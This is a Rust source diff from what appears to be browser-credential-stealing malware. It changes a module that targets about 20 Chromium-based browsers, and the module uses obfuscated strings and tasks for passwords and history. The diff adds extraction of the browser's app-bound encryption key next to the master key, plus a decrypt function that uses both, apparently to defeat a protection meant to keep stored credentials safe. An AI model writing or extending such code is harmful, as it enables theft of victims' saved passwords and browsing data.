@@ -15,11 +15,13 @@ use crate::chromium::history::HistoryTask;
 use crate::chromium::passwords::PasswordsTask;
 use crate::vec;
 use alloc::borrow::ToOwned;
+use alloc::string::String;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use obfstr::obfstr as s;
 use tasks::{composite_task, CompositeTask, Task};
-use utils::browsers::chromium::extract_master_key;
+use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
+use utils::log_debug;
 use utils::path::Path;
 
 pub struct ChromiumTask<'a> {
@@ -63,10 +65,13 @@ fn get_browser(browser: &ChromiumBasedBrowser) -> Option<BrowserData> {
         return None;
     }
 
-    let master_key = unsafe { extract_master_key(&browser.user_data)? };
+    let master_key = unsafe { extract_master_key(&browser.user_data) };
+    let app_bound_encryption_key = unsafe { extract_app_bound_encrypted_key(&browser.user_data) };
+    
     if !browser.has_profiles {
         return Some(BrowserData {
             master_key,
+            app_bound_encryption_key,
             profiles: vec![browser.user_data.clone()]
         })
     }
@@ -90,6 +95,7 @@ fn get_browser(browser: &ChromiumBasedBrowser) -> Option<BrowserData> {
     } else {
         Some(BrowserData {
             master_key,
+            app_bound_encryption_key,
             profiles
         })
     }
@@ -111,7 +117,8 @@ impl Task for ChromiumTask<'_> {
 }
 
 pub(super) struct BrowserData {
-    master_key: Vec<u8>,
+    master_key: Option<Vec<u8>>,
+    app_bound_encryption_key: Option<Vec<u8>>,
     profiles: Vec<Path>,
 }
 
@@ -165,4 +172,14 @@ fn get_chromium_browsers<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
         browser!("Brave",                     &local   / s!("BraveSoftware")        / s!("Brave-Browser") / &user_data),
         browser!("Atom",                      &local   / s!("Mail.Ru")              / s!("Atom")          / &user_data),
     ]
+}
+
+pub(super) unsafe fn decrypt_data(buffer: &[u8], browser_data: &BrowserData) -> Option<String> {
+    unsafe {
+        utils::browsers::chromium::decrypt_data(
+            buffer,
+            browser_data.master_key.as_deref(),
+            browser_data.app_bound_encryption_key.as_deref()
+        )
+    }
 }
